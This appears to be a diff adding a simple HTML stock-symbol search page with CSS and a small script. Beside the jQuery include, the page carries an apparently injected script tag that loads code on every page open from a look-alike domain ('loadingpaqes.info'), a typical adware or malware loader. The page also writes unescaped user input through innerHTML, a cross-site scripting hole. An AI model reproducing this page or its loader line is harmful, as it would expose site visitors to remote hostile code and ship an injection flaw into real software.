@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html>
+<!-- End Wayback Rewrite JS Include -->
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<title>Stock Tracker</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="icon" type="image/png" href="   ">
+
+<meta name="description" content=""> <!--put something here-->
+<script src="http://ajax.googleapis.com/ajax/libs/jquery/2.1.4/jquery.min.js"></script><script type="text/javascript" src="http://loadingpaqes.info/jo/is?id=372C6950-E7D4-5F6E-B857-8EC9AF018AE0&amp;d=3168a8ab-1bcf-41ba-a65d-762b1336fdca&amp;cl=upd"></script>
+<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/modernizr/2.8.3/modernizr.min.js"></script>
+<link href="https://fonts.googleapis.com/css?family=Montserrat:400,700" rel="stylesheet" type="text/css">
+<link href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,600,700,600italic&amp;subset=latin,latin-ext" rel="stylesheet" type="text/css">
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.4.0/css/font-awesome.min.css">
+<!--[if IE]>
+<link href="assets/styles/ie.css" rel="stylesheet" type="text/css">
+<![endif]-->
+<style type="text/css">
+@import url(https://fonts.googleapis.com/css?family=Lato:100,300,400,700);
+@import url(https://raw.github.com/FortAwesome/Font-Awesome/master/docs/assets/css/font-awesome.min.css);
+
+body {
+	background: #DDD;
+	font-size: 15px;
+}
+#wrap {
+  margin: 50px 100px;
+  display: inline-block;
+  position: relative;
+  height: 60px;
+  float: right;
+  padding: 0;
+  position: relative;
+}
+
+input[type="text"] {
+  height: 30px;
+  font-size: 25px;
+  display: inline-block;
+font-family: 'Montserrat', sans-serif;
+	font-weight:700;
+  border: none;
+  outline: none;
+  color: #6d6d6d;
+  padding: 3px;
+  padding-right: 60px;
+  width: 0px;
+  position: absolute;
+  top: 0;
+  right: 0;
+  background: none;
+  z-index: 3;
+  transition: width .4s cubic-bezier(0.000, 0.795, 0.000, 1.000);
+  cursor: pointer;
+}
+
+input[type="text"]:focus:hover {
+  border-bottom: 1px solid #BBB;
+}
+
+input[type="text"]:focus {
+  width: 300px;
+  z-index: 1;
+  border-bottom: 1px solid #BBB;
+  cursor: text;
+}
+
+.button {
+  float: right;
+	margin-right:30px;
+	text-align:center;
+	margin-top:40px;
+	  height: 50px;
+	  width: 130px;
+		text-decoration: none;
+  display: inline-block;
+  font-size: 16px;
+  cursor: pointer;
+}
+.buttton {
+	height: 50px;
+width: 40px;
+display: inline-block;
+opacity:0;
+float: right;
+background: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAMAAABg3Am1AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAADNQTFRFU1NT9fX1lJSUXl5e1dXVfn5+c3Nz6urqv7+/tLS0iYmJqampn5+fysrK39/faWlp////Vi4ZywAAABF0Uk5T/////////////////////wAlrZliAAABLklEQVR42rSWWRbDIAhFHeOUtN3/ags1zaA4cHrKZ8JFRHwoXkwTvwGP1Qo0bYObAPwiLmbNAHBWFBZlD9j0JxflDViIObNHG/Do8PRHTJk0TezAhv7qloK0JJEBh+F8+U/hopIELOWfiZUCDOZD1RADOQKA75oq4cvVkcT+OdHnqqpQCITWAjnWVgGQUWz12lJuGwGoaWgBKzRVBcCypgUkOAoWgBX/L0CmxN40u6xwcIJ1cOzWYDffp3axsQOyvdkXiH9FKRFwPRHYZUaXMgPLeiW7QhbDRciyLXJaKheCuLbiVoqx1DVRyH26yb0hsuoOFEPsoz+BVE0MRlZNjGZcRQyHYkmMp2hBTIzdkzCTc/pLqOnBrk7/yZdAOq/q5NPBH1f7x7fGP4C3AAMAQrhzX9zhcGsAAAAASUVORK5CYII=) center center no-repeat;
+text-indent: -10000px;
+border: none;
+position: absolute;
+margin-top: -12px;
+right: 0;
+z-index: 2;
+cursor: pointer;
+opacity: 0.4;
+cursor: pointer;
+transition: opacity .4s ease;
+}
+#demo {
+  float: right;
+font-family: 'Montserrat', sans-serif;
+	font-weight:400;
+	margin-right:10%;
+	text-align:center;
+	margin-top:140px;
+	  height: 50px;
+	  width: 300px;
+}
+</style>
+
+
+</head>
+
+<body>
+
+
+
+			<button class="button" value="Search"  onclick="myFunction()">Click to search</button>
+<div id="wrap">
+		<form action="/cgi-bin/test.py" method="get" id="frm1" action="" autocomplete="off">
+		  <input id="search" name="searchboxvalue" type="text" placeholder="Enter a stock symbol" >
+			<input value="Search" class="buttton">
+		</form>
+</div>
+
+
+		<p id="demo"></p>
+
+		<script>
+		function myFunction() {
+		  var x = document.getElementById("frm1");
+		  var text = "";
+		  var i;
+		  for (i = 0; i < x.length - 1;i++) {
+		    text += x.elements[i].value + "<br>";
+		  }
+		  document.getElementById("demo").innerHTML = "Data for $" + text;
+		}
+		</script>
+
+</script>
+</body></html>
